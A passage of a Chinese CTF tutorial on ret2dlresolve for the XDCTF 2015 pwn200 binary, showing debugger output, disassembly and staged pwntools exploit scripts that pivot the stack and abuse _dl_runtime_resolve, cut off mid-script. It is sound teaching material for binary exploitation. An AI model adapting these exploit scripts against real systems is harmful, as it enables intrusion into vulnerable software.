<span class=p>[</span><span class=o>*</span><span class=p>]</span> <span class=s1>&#39;/mnt/hgfs/ctf-challenges/pwn/stackoverflow/ret2dlresolve/2015-xdctf-pwn200/32/no-relro/main_no_relro_32&#39;</span>
    <span class=n>Arch</span><span class=p>:</span>     <span class=n>i386</span><span class=o>-</span><span class=mi>32</span><span class=o>-</span><span class=n>little</span>
    <span class=n>RELRO</span><span class=p>:</span>    <span class=n>No</span> <span class=n>RELRO</span>
    <span class=n>Stack</span><span class=p>:</span>    <span class=n>No</span> <span class=n>canary</span> <span class=n>found</span>
    <span class=n>NX</span><span class=p>:</span>       <span class=n>NX</span> <span class=n>enabled</span>
    <span class=n>PIE</span><span class=p>:</span>      <span class=n>No</span> <span class=n>PIE</span> <span class=p>(</span><span class=mh>0x8048000</span><span class=p>)</span>
<span class=p>[</span><span class=o>*</span><span class=p>]</span> <span class=n>Loaded</span> <span class=mi>10</span> <span class=n>cached</span> <span class=n>gadgets</span> <span class=k>for</span> <span class=s1>&#39;./main_no_relro_32&#39;</span>
<span class=p>[</span><span class=o>*</span><span class=p>]</span> <span class=n>Switching</span> <span class=n>to</span> <span class=n>interactive</span> <span class=n>mode</span>
<span class=err>$</span> <span class=n>ls</span>
<span class=n>exp</span><span class=o>-</span><span class=n>no</span><span class=o>-</span><span class=n>relro</span><span class=o>.</span><span class=n>py</span>  <span class=n>main_no_relro_32</span>
</code></pre></div> <h3 id=partial-relro>Partial RELRO<a class=headerlink href=#partial-relro title="Permanent link">&para;</a></h3> <p>首先我们可以编译源文件 main.c 得到二进制文件，这里取消了 Canary 保护。</p> <div class=highlight><pre><span></span><code>❯ gcc -fno-stack-protector -m32 -z relro -z lazy -no-pie ../../main.c -o main_partial_relro_32
❯ checksec main_partial_relro_32
<span class=o>[</span>*<span class=o>]</span> <span class=s1>&#39;/mnt/hgfs/ctf-challenges/pwn/stackoverflow/ret2dlresolve/2015-xdctf-pwn200/32/parti</span>
<span class=s1>al-relro/main_partial_relro_32&#39;</span>
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE <span class=o>(</span>0x8048000<span class=o>)</span>
</code></pre></div> <p>在这种情况下，ELF 文件中的 .dynamic 节将会变成只读的，这时我们可以通过伪造重定位表项的方式来调用目标函数。</p> <p>在下面的讲解过程中，本文会按照以下两种不同的方式来使用该技巧。</p> <ol> <li>通过手工伪造的方式使用该技巧，从而获取 shell。这种方式虽然比较麻烦，但是可以仔细理解 ret2dlresolve 的原理。</li> <li>利用工具来实现攻击，从而获取 shell。这种方式比较简单，但我们还是应该充分理解背后的原理，不能只是会使用工具。</li> </ol> <h4 id=_2>手工伪造<a class=headerlink href=#_2 title="Permanent link">&para;</a></h4> <p>这题我们不考虑有 libc 的情况。通过分析，我们可以发现程序有一个很明显的栈溢出漏洞，缓冲区到返回地址间的偏移为 112。</p> <div class=highlight><pre><span></span><code><span class=nf>gef</span><span class=err>➤</span>  <span class=no>pattern</span> <span class=no>create</span> <span class=mi>200</span>
<span class=err>[+]</span> <span class=nf>Generating</span> <span class=no>a</span> <span class=no>pattern</span> <span class=no>of</span> <span class=mi>200</span> <span class=no>bytes</span>
<span class=nf>aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab</span>
<span class=err>[+]</span> <span class=nf>Saved</span> <span class=no>as</span> <span class=err>&#39;</span><span class=no>$_gef0</span><span class=err>&#39;</span>
<span class=nf>gef</span><span class=err>➤</span>  <span class=no>r</span>
<span class=nf>Starting</span> <span class=no>program</span><span class=p>:</span> <span class=err>/</span><span class=no>mnt</span><span class=err>/</span><span class=no>hgfs</span><span class=err>/</span><span class=no>ctf-challenges</span><span class=err>/</span><span class=no>pwn</span><span class=err>/</span><span class=no>stackoverflow</span><span class=err>/</span><span class=no>ret2dlresolve</span><span class=err>/</span><span class=mi>2015</span><span class=p>-</span><span class=no>xdctf-pwn200</span><span class=err>/</span><span class=mi>32</span><span class=err>/</span><span class=no>partial-relro</span><span class=err>/</span><span class=no>main_partial_relro_32</span>
<span class=nf>Welcome</span> <span class=no>to</span> <span class=no>XDCTF2015</span><span class=err>~</span><span class=p>!</span>
<span class=nf>aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab</span>

<span class=nf>Program</span> <span class=no>received</span> <span class=no>signal</span> <span class=no>SIGSEGV</span><span class=p>,</span> <span class=no>Segmentation</span> <span class=no>fault.</span>
<span class=err>[</span> <span class=nl>Legend:</span> <span class=nf>Modified</span> <span class=no>register</span> <span class=err>|</span> <span class=no>Code</span> <span class=err>|</span> <span class=no>Heap</span> <span class=err>|</span> <span class=no>Stack</span> <span class=err>|</span> <span class=no>String</span> <span class=p>]</span>
<span class=err>─────────────────────────────────────────────────────────────────────────</span> <span class=nf>registers</span> <span class=err>────</span>
<span class=nf>$eax</span>   <span class=p>:</span> <span class=mi>0xc9</span>
<span class=nf>$ebx</span>   <span class=p>:</span> <span class=mi>0x62616162</span> <span class=p>(</span><span class=err>&quot;</span><span class=no>baab</span><span class=err>&quot;?</span><span class=p>)</span>
<span class=nf>$ecx</span>   <span class=p>:</span> <span class=mi>0xffffcddc</span>  <span class=err>→</span>  <span class=err>&quot;</span><span class=no>aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaama</span><span class=p>[...]</span><span class=err>&quot;</span>
<span class=nf>$edx</span>   <span class=p>:</span> <span class=mi>0x100</span>
<span class=nf>$esp</span>   <span class=p>:</span> <span class=mi>0xffffce50</span>  <span class=err>→</span>  <span class=err>&quot;</span><span class=no>eaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqa</span><span class=p>[...]</span><span class=err>&quot;</span>
<span class=nf>$ebp</span>   <span class=p>:</span> <span class=mi>0x62616163</span> <span class=p>(</span><span class=err>&quot;</span><span class=no>caab</span><span class=err>&quot;?</span><span class=p>)</span>
<span class=nf>$esi</span>   <span class=p>:</span> <span class=mi>0xf7fb0000</span>  <span class=err>→</span>  <span class=mi>0x001d7d6c</span>
<span class=nf>$edi</span>   <span class=p>:</span> <span class=mi>0xffffcec0</span>  <span class=err>→</span>  <span class=mi>0x00000001</span>
<span class=nf>$eip</span>   <span class=p>:</span> <span class=mi>0x62616164</span> <span class=p>(</span><span class=err>&quot;</span><span class=no>daab</span><span class=err>&quot;?</span><span class=p>)</span>
<span class=nl>$eflags:</span> <span class=err>[</span><span class=nf>zero</span> <span class=no>carry</span> <span class=no>parity</span> <span class=no>adjust</span> <span class=no>SIGN</span> <span class=no>trap</span> <span class=no>INTERRUPT</span> <span class=no>direction</span> <span class=no>overflow</span> <span class=no>RESUME</span> <span class=no>virtualx86</span> <span class=no>identification</span><span class=p>]</span>
<span class=nl>$cs:</span> <span class=err>0</span><span class=nf>x0023</span> <span class=no>$ss</span><span class=p>:</span> <span class=mi>0x002b</span> <span class=no>$ds</span><span class=p>:</span> <span class=mi>0x002b</span> <span class=no>$es</span><span class=p>:</span> <span class=mi>0x002b</span> <span class=no>$fs</span><span class=p>:</span> <span class=mi>0x0000</span> <span class=no>$gs</span><span class=p>:</span> <span class=mi>0x0063</span>
<span class=err>─────────────────────────────────────────────────────────────────────────────</span> <span class=nf>stack</span> <span class=err>────</span>
<span class=err>0</span><span class=nf>xffffce50</span><span class=err>│+</span><span class=mi>0x0000</span><span class=p>:</span> <span class=err>&quot;</span><span class=no>eaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqa</span><span class=p>[...]</span><span class=err>&quot;</span>    <span class=err>←</span> <span class=no>$esp</span>
<span class=err>0</span><span class=nf>xffffce54</span><span class=err>│+</span><span class=mi>0x0004</span><span class=p>:</span> <span class=err>&quot;</span><span class=no>faabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabra</span><span class=p>[...]</span><span class=err>&quot;</span>
<span class=err>0</span><span class=nf>xffffce58</span><span class=err>│+</span><span class=mi>0x0008</span><span class=p>:</span> <span class=err>&quot;</span><span class=no>gaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsa</span><span class=p>[...]</span><span class=err>&quot;</span>
<span class=err>0</span><span class=nf>xffffce5c</span><span class=err>│+</span><span class=mi>0x000c</span><span class=p>:</span> <span class=err>&quot;</span><span class=no>haabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabta</span><span class=p>[...]</span><span class=err>&quot;</span>
<span class=err>0</span><span class=nf>xffffce60</span><span class=err>│+</span><span class=mi>0x0010</span><span class=p>:</span> <span class=err>&quot;</span><span class=no>iaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabua</span><span class=p>[...]</span><span class=err>&quot;</span>
<span class=err>0</span><span class=nf>xffffce64</span><span class=err>│+</span><span class=mi>0x0014</span><span class=p>:</span> <span class=err>&quot;</span><span class=no>jaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabva</span><span class=p>[...]</span><span class=err>&quot;</span>
<span class=err>0</span><span class=nf>xffffce68</span><span class=err>│+</span><span class=mi>0x0018</span><span class=p>:</span> <span class=err>&quot;</span><span class=no>kaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwa</span><span class=p>[...]</span><span class=err>&quot;</span>
<span class=err>0</span><span class=nf>xffffce6c</span><span class=err>│+</span><span class=mi>0x001c</span><span class=p>:</span> <span class=err>&quot;</span><span class=no>laabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxa</span><span class=p>[...]</span><span class=err>&quot;</span>
<span class=err>───────────────────────────────────────────────────────────────────────</span> <span class=nl>code:x86:</span><span class=err>32</span> <span class=err>────</span>
<span class=err>[!]</span> <span class=nf>Cannot</span> <span class=no>disassemble</span> <span class=no>from</span> <span class=no>$PC</span>
<span class=err>[!]</span> <span class=nf>Cannot</span> <span class=no>access</span> <span class=no>memory</span> <span class=no>at</span> <span class=no>address</span> <span class=mi>0x62616164</span>
<span class=err>───────────────────────────────────────────────────────────────────────────</span> <span class=nf>threads</span> <span class=err>────</span>
<span class=err>[</span><span class=c1>#0] Id 1, Name: &quot;main_partial_re&quot;, stopped 0x62616164 in ?? (), reason: SIGSEGV</span>
<span class=err>─────────────────────────────────────────────────────────────────────────────</span> <span class=nf>trace</span> <span class=err>────</span>
<span class=err>────────────────────────────────────────────────────────────────────────────────────────</span>
<span class=err>0</span><span class=nf>x62616164</span> <span class=no>in</span> <span class=err>??</span> <span class=p>()</span>
<span class=nf>gef</span><span class=err>➤</span>  <span class=no>pattern</span> <span class=no>search</span> <span class=mi>0x62616164</span>
<span class=err>[+]</span> <span class=nf>Searching</span> <span class=err>&#39;</span><span class=mi>0x62616164</span><span class=err>&#39;</span>
<span class=err>[+]</span> <span class=nf>Found</span> <span class=no>at</span> <span class=no>offset</span> <span class=mi>112</span> <span class=p>(</span><span class=no>little-endian</span> <span class=no>search</span><span class=p>)</span> <span class=no>likely</span>
</code></pre></div> <p>在下面的每一个阶段中，我们会一步步地深入理解如何构造 payload。</p> <h5 id=stage-1>stage 1<a class=headerlink href=#stage-1 title="Permanent link">&para;</a></h5> <p>在这一阶段，我们的目的比较简单，就是控制程序直接执行 write 函数。在栈溢出的情况下，我们其实可以直接控制返回地址来控制程序直接执行 write 函数。但是这里我们采用一个相对复杂点的办法，即先使用栈迁移，将栈迁移到 bss 段，然后再来控制 write 函数。因此，这一阶段主要包括两步</p> <ol> <li>将栈迁移到 bss 段。</li> <li>通过 write 函数的 plt 表项来执行 write 函数，输出相应字符串。</li> </ol> <p>这里使用了 pwntools 中的 ROP 模块。具体代码如下</p> <div class=highlight><pre><span></span><code><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
<span class=n>elf</span> <span class=o>=</span> <span class=n>ELF</span><span class=p>(</span><span class=s1>&#39;./main_partial_relro_32&#39;</span><span class=p>)</span>
<span class=n>r</span> <span class=o>=</span> <span class=n>process</span><span class=p>(</span><span class=s1>&#39;./main_partial_relro_32&#39;</span><span class=p>)</span>
<span class=n>rop</span> <span class=o>=</span> <span class=n>ROP</span><span class=p>(</span><span class=s1>&#39;./main_partial_relro_32&#39;</span><span class=p>)</span>

<span class=n>offset</span> <span class=o>=</span> <span class=mi>112</span>
<span class=n>bss_addr</span> <span class=o>=</span> <span class=n>elf</span><span class=o>.</span><span class=n>bss</span><span class=p>()</span>

<span class=n>r</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s1>&#39;Welcome to XDCTF2015~!</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>)</span>

<span class=c1># stack privot to bss segment, set esp = base_stage</span>
<span class=n>stack_size</span> <span class=o>=</span> <span class=mh>0x800</span> <span class=c1># new stack size is 0x800</span>
<span class=n>base_stage</span> <span class=o>=</span> <span class=n>bss_addr</span> <span class=o>+</span> <span class=n>stack_size</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=s1>&#39;a&#39;</span> <span class=o>*</span> <span class=n>offset</span><span class=p>)</span> <span class=c1># padding</span>
<span class=n>rop</span><span class=o>.</span><span class=n>read</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=n>base_stage</span><span class=p>,</span> <span class=mi>100</span><span class=p>)</span> <span class=c1># read 100 byte to base_stage</span>
<span class=n>rop</span><span class=o>.</span><span class=n>migrate</span><span class=p>(</span><span class=n>base_stage</span><span class=p>)</span>
<span class=n>r</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=n>rop</span><span class=o>.</span><span class=n>chain</span><span class=p>())</span>

<span class=c1># write &quot;/bin/sh&quot;</span>
<span class=n>rop</span> <span class=o>=</span> <span class=n>ROP</span><span class=p>(</span><span class=s1>&#39;./main_partial_relro_32&#39;</span><span class=p>)</span>
<span class=n>sh</span> <span class=o>=</span> <span class=s2>&quot;/bin/sh&quot;</span>
<span class=n>rop</span><span class=o>.</span><span class=n>write</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span> <span class=n>base_stage</span> <span class=o>+</span> <span class=mi>80</span><span class=p>,</span> <span class=nb>len</span><span class=p>(</span><span class=n>sh</span><span class=p>))</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=s1>&#39;a&#39;</span> <span class=o>*</span> <span class=p>(</span><span class=mi>80</span> <span class=o>-</span> <span class=nb>len</span><span class=p>(</span><span class=n>rop</span><span class=o>.</span><span class=n>chain</span><span class=p>())))</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=n>sh</span><span class=p>)</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=s1>&#39;a&#39;</span> <span class=o>*</span> <span class=p>(</span><span class=mi>100</span> <span class=o>-</span> <span class=nb>len</span><span class=p>(</span><span class=n>rop</span><span class=o>.</span><span class=n>chain</span><span class=p>())))</span>
<span class=n>r</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=n>rop</span><span class=o>.</span><span class=n>chain</span><span class=p>())</span>

<span class=n>r</span><span class=o>.</span><span class=n>interactive</span><span class=p>()</span>
</code></pre></div> <p>结果如下</p> <div class=highlight><pre><span></span><code>❯ python stage1.py
<span class=o>[</span>*<span class=o>]</span> <span class=s1>&#39;/mnt/hgfs/ctf-challenges/pwn/stackoverflow/ret2dlresolve/2015-xdctf-pwn200/32/partial-relro/main_partial_relro_32&#39;</span>
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE <span class=o>(</span>0x8048000<span class=o>)</span>
<span class=o>[</span>+<span class=o>]</span> Starting <span class=nb>local</span> process <span class=s1>&#39;./main_partial_relro_32&#39;</span>: pid <span class=m>25112</span>
<span class=o>[</span>*<span class=o>]</span> Loaded <span class=m>10</span> cached gadgets <span class=k>for</span> <span class=s1>&#39;./main_partial_relro_32&#39;</span>
<span class=o>[</span>*<span class=o>]</span> Switching to interactive mode
/bin/sh<span class=o>[</span>*<span class=o>]</span> Got EOF <span class=k>while</span> reading in interactive
</code></pre></div> <h5 id=stage-2>stage 2<a class=headerlink href=#stage-2 title="Permanent link">&para;</a></h5> <p>在这一阶段，我们将会进一步利用 <code>_dl_runtime_resolve</code> 相关的知识来控制程序执行 write 函数。</p> <ol> <li>将栈迁移到 bss 段。</li> <li>控制程序直接执行 plt0 中的相关指令，即 push linkmap 以及跳转到 <code>_dl_runtime_resolve</code> 函数。这时，我们还需要提供 write 重定位项在 got 表中的偏移。这里，我们可以直接使用 write plt 中提供的偏移，即 0x080483C6 处所给出的 0x20。其实，我们也可以跳转到 0x080483C6 地址处，利用原有的指令来提供 write 函数的偏移，并跳转到 plt0。</li> </ol> <div class=highlight><pre><span></span><code>.plt:08048370 ; ===========================================================================
.plt:08048370
.plt:08048370 ; Segment type: Pure code
.plt:08048370 ; Segment permissions: Read/Execute
.plt:08048370 _plt            segment para public &#39;CODE&#39; use32
.plt:08048370                 assume cs:_plt
.plt:08048370                 ;org 8048370h
.plt:08048370                 assume es:nothing, ss:nothing, ds:_data, fs:nothing, gs:nothing
.plt:08048370
.plt:08048370 ; =============== S U B R O U T I N E =======================================
.plt:08048370
.plt:08048370
.plt:08048370 sub_8048370     proc near               ; CODE XREF: .plt:0804838B↓j
.plt:08048370                                         ; .plt:0804839B↓j ...
.plt:08048370 ; __unwind {
.plt:08048370                 push    ds:dword_804A004
.plt:08048376                 jmp     ds:dword_804A008
.plt:08048376 sub_8048370     endp
.plt:08048376
...
.plt:080483C0 ; =============== S U B R O U T I N E =======================================
.plt:080483C0
.plt:080483C0 ; Attributes: thunk
.plt:080483C0
.plt:080483C0 ; ssize_t write(int fd, const void *buf, size_t n)
.plt:080483C0 _write          proc near               ; CODE XREF: main+8A↓p
.plt:080483C0
.plt:080483C0 fd              = dword ptr  4
.plt:080483C0 buf             = dword ptr  8
.plt:080483C0 n               = dword ptr  0Ch
.plt:080483C0
.plt:080483C0                 jmp     ds:off_804A01C
.plt:080483C0 _write          endp
.plt:080483C0
.plt:080483C6 ; ---------------------------------------------------------------------------
.plt:080483C6                 push    20h ; &#39; &#39;
.plt:080483CB                 jmp     sub_8048370
</code></pre></div> <p>具体代码如下</p> <div class=highlight><pre><span></span><code><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
<span class=n>elf</span> <span class=o>=</span> <span class=n>ELF</span><span class=p>(</span><span class=s1>&#39;./main_partial_relro_32&#39;</span><span class=p>)</span>
<span class=n>r</span> <span class=o>=</span> <span class=n>process</span><span class=p>(</span><span class=s1>&#39;./main_partial_relro_32&#39;</span><span class=p>)</span>
<span class=n>rop</span> <span class=o>=</span> <span class=n>ROP</span><span class=p>(</span><span class=s1>&#39;./main_partial_relro_32&#39;</span><span class=p>)</span>

<span class=n>offset</span> <span class=o>=</span> <span class=mi>112</span>
<span class=n>bss_addr</span> <span class=o>=</span> <span class=n>elf</span><span class=o>.</span><span class=n>bss</span><span class=p>()</span>

<span class=n>r</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s1>&#39;Welcome to XDCTF2015~!</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>)</span>

<span class=c1># stack privot to bss segment, set esp = base_stage</span>
<span class=n>stack_size</span> <span class=o>=</span> <span class=mh>0x800</span> <span class=c1># new stack size is 0x800</span>
<span class=n>base_stage</span> <span class=o>=</span> <span class=n>bss_addr</span> <span class=o>+</span> <span class=n>stack_size</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=s1>&#39;a&#39;</span> <span class=o>*</span> <span class=n>offset</span><span class=p>)</span> <span class=c1># padding</span>
<span class=n>rop</span><span class=o>.</span><span class=n>read</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=n>base_stage</span><span class=p>,</span> <span class=mi>100</span><span class=p>)</span> <span class=c1># read 100 byte to base_stage</span>
<span class=n>rop</span><span class=o>.</span><span class=n>migrate</span><span class=p>(</span><span class=n>base_stage</span><span class=p>)</span>
<span class=n>r</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=n>rop</span><span class=o>.</span><span class=n>chain</span><span class=p>())</span>

<span class=c1># write &quot;/bin/sh&quot;</span>
<span class=n>rop</span> <span class=o>=</span> <span class=n>ROP</span><span class=p>(</span><span class=s1>&#39;./main_partial_relro_32&#39;</span><span class=p>)</span>
<span class=n>plt0</span> <span class=o>=</span> <span class=n>elf</span><span class=o>.</span><span class=n>get_section_by_name</span><span class=p>(</span><span class=s1>&#39;.plt&#39;</span><span class=p>)</span><span class=o>.</span><span class=n>header</span><span class=o>.</span><span class=n>sh_addr</span>
<span class=n>jmprel_data</span> <span class=o>=</span> <span class=n>elf</span><span class=o>.</span><span class=n>get_section_by_name</span><span class=p>(</span><span class=s1>&#39;.rel.plt&#39;</span><span class=p>)</span><span class=o>.</span><span class=n>data</span><span class=p>()</span>
<span class=n>writegot</span> <span class=o>=</span> <span class=n>elf</span><span class=o>.</span><span class=n>got</span><span class=p>[</span><span class=s2>&quot;write&quot;</span><span class=p>]</span>
<span class=n>write_reloc_offset</span> <span class=o>=</span> <span class=n>jmprel_data</span><span class=o>.</span><span class=n>find</span><span class=p>(</span><span class=n>p32</span><span class=p>(</span><span class=n>writegot</span><span class=p>,</span><span class=n>endian</span><span class=o>=</span><span class=s2>&quot;little&quot;</span><span class=p>))</span>
<span class=nb>print</span><span class=p>(</span><span class=n>write_reloc_offset</span><span class=p>)</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=n>plt0</span><span class=p>)</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=n>write_reloc_offset</span><span class=p>)</span>
<span class=c1># fake ret addr of write</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=s1>&#39;bbbb&#39;</span><span class=p>)</span>
<span class=c1># fake write args, write(1, base_stage+80, sh)</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>  
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=n>base_stage</span> <span class=o>+</span> <span class=mi>80</span><span class=p>)</span>
<span class=n>sh</span> <span class=o>=</span> <span class=s2>&quot;/bin/sh&quot;</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=nb>len</span><span class=p>(</span><span class=n>sh</span><span class=p>))</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=s1>&#39;a&#39;</span> <span class=o>*</span> <span class=p>(</span><span class=mi>80</span> <span class=o>-</span> <span class=nb>len</span><span class=p>(</span><span class=n>rop</span><span class=o>.</span><span class=n>chain</span><span class=p>())))</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=n>sh</span><span class=p>)</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=s1>&#39;a&#39;</span> <span class=o>*</span> <span class=p>(</span><span class=mi>100</span> <span class=o>-</span> <span class=nb>len</span><span class=p>(</span><span class=n>rop</span><span class=o>.</span><span class=n>chain</span><span class=p>())))</span>

<span class=n>r</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=n>rop</span><span class=o>.</span><span class=n>chain</span><span class=p>())</span>
<span class=n>r</span><span class=o>.</span><span class=n>interactive</span><span class=p>()</span>
</code></pre></div> <p>效果如下，仍然输出了 sh 对应的字符串。</p> <div class=highlight><pre><span></span><code>❯ python stage2.py
<span class=o>[</span>*<span class=o>]</span> <span class=s1>&#39;/mnt/hgfs/ctf-challenges/pwn/stackoverflow/ret2dlresolve/2015-xdctf-pwn200/32/partial-relro/main_partial_relro_32&#39;</span>
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE <span class=o>(</span>0x8048000<span class=o>)</span>
<span class=o>[</span>+<span class=o>]</span> Starting <span class=nb>local</span> process <span class=s1>&#39;./main_partial_relro_32&#39;</span>: pid <span class=m>25131</span>
<span class=o>[</span>*<span class=o>]</span> Loaded <span class=m>10</span> cached gadgets <span class=k>for</span> <span class=s1>&#39;./main_partial_relro_32&#39;</span>
<span class=m>32</span>
<span class=o>[</span>*<span class=o>]</span> Switching to interactive mode
/bin/sh<span class=o>[</span>*<span class=o>]</span> Got EOF <span class=k>while</span> reading in interactive
</code></pre></div> <h5 id=stage-3>stage 3<a class=headerlink href=#stage-3 title="Permanent link">&para;</a></h5> <p>这一次，我们同样控制 <code>_dl_runtime_resolve</code> 函数中的 reloc_offset 参数，不过这次控制其指向我们伪造的 write 重定位项。</p> <p>鉴于 pwntools 本身并不支持对重定位表项的信息的获取。这里我们手动看一下</p> <div class=highlight><pre><span></span><code>❯ readelf -r main_partial_relro_32

Relocation section <span class=s1>&#39;.rel.dyn&#39;</span> at offset 0x30c contains <span class=m>3</span> entries:
 Offset     Info    Type            Sym.Value  Sym. Name
08049ff4  <span class=m>00000306</span> R_386_GLOB_DAT    <span class=m>00000000</span>   __gmon_start__
08049ff8  <span class=m>00000706</span> R_386_GLOB_DAT    <span class=m>00000000</span>   stdin@GLIBC_2.0
08049ffc  <span class=m>00000806</span> R_386_GLOB_DAT    <span class=m>00000000</span>   stdout@GLIBC_2.0

Relocation section <span class=s1>&#39;.rel.plt&#39;</span> at offset 0x324 contains <span class=m>5</span> entries:
 Offset     Info    Type            Sym.Value  Sym. Name
0804a00c  <span class=m>00000107</span> R_386_JUMP_SLOT   <span class=m>00000000</span>   setbuf@GLIBC_2.0
0804a010  <span class=m>00000207</span> R_386_JUMP_SLOT   <span class=m>00000000</span>   read@GLIBC_2.0
0804a014  <span class=m>00000407</span> R_386_JUMP_SLOT   <span class=m>00000000</span>   strlen@GLIBC_2.0
0804a018  <span class=m>00000507</span> R_386_JUMP_SLOT   <span class=m>00000000</span>   __libc_start_main@GLIBC_2.0
0804a01c  <span class=m>00000607</span> R_386_JUMP_SLOT   <span class=m>00000000</span>   write@GLIBC_2.0
</code></pre></div> <p>可以看出 write 的重定表项的 r_offset=0x0804a01c，r_info=0x00000607。具体代码如下</p> <div class=highlight><pre><span></span><code><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
<span class=n>elf</span> <span class=o>=</span> <span class=n>ELF</span><span class=p>(</span><span class=s1>&#39;./main_partial_relro_32&#39;</span><span class=p>)</span>
<span class=n>r</span> <span class=o>=</span> <span class=n>process</span><span class=p>(</span><span class=s1>&#39;./main_partial_relro_32&#39;</span><span class=p>)</span>
<span class=n>rop</span> <span class=o>=</span> <span class=n>ROP</span><span class=p>(</span><span class=s1>&#39;./main_partial_relro_32&#39;</span><span class=p>)</span>

<span class=n>offset</span> <span class=o>=</span> <span class=mi>112</span>
<span class=n>bss_addr</span> <span class=o>=</span> <span class=n>elf</span><span class=o>.</span><span class=n>bss</span><span class=p>()</span>

<span class=n>r</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s1>&#39;Welcome to XDCTF2015~!</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>)</span>

<span class=c1># stack privot to bss segment, set esp = base_stage</span>
<span class=n>stack_size</span> <span class=o>=</span> <span class=mh>0x800</span> <span class=c1># new stack size is 0x800</span>
<span class=n>base_stage</span> <span class=o>=</span> <span class=n>bss_addr</span> <span class=o>+</span> <span class=n>stack_size</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=s1>&#39;a&#39;</span> <span class=o>*</span> <span class=n>offset</span><span class=p>)</span> <span class=c1># padding</span>
<span class=n>rop</span><span class=o>.</span><span class=n>read</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=n>base_stage</span><span class=p>,</span> <span class=mi>100</span><span class=p>)</span> <span class=c1># read 100 byte to base_stage</span>
<span class=n>rop</span><span class=o>.</span><span class=n>migrate</span><span class=p>(</span><span class=n>base_stage</span><span class=p>)</span>
<span class=n>r</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=n>rop</span><span class=o>.</span><span class=n>chain</span><span class=p>())</span>

<span class=c1># write &quot;/bin/sh&quot;</span>
<span class=n>rop</span> <span class=o>=</span> <span class=n>ROP</span><span class=p>(</span><span class=s1>&#39;./main_partial_relro_32&#39;</span><span class=p>)</span>
<span class=n>plt0</span> <span class=o>=</span> <span class=n>elf</span><span class=o>.</span><span class=n>get_section_by_name</span><span class=p>(</span><span class=s1>&#39;.plt&#39;</span><span class=p>)</span><span class=o>.</span><span class=n>header</span><span class=o>.</span><span class=n>sh_addr</span>
<span class=n>got0</span> <span class=o>=</span> <span class=n>elf</span><span class=o>.</span><span class=n>get_section_by_name</span><span class=p>(</span><span class=s1>&#39;.got&#39;</span><span class=p>)</span><span class=o>.</span><span class=n>header</span><span class=o>.</span><span class=n>sh_addr</span>

<span class=n>rel_plt</span> <span class=o>=</span> <span class=n>elf</span><span class=o>.</span><span class=n>get_section_by_name</span><span class=p>(</span><span class=s1>&#39;.rel.plt&#39;</span><span class=p>)</span><span class=o>.</span><span class=n>header</span><span class=o>.</span><span class=n>sh_addr</span>
<span class=c1># make base_stage+24 ---&gt; fake reloc</span>
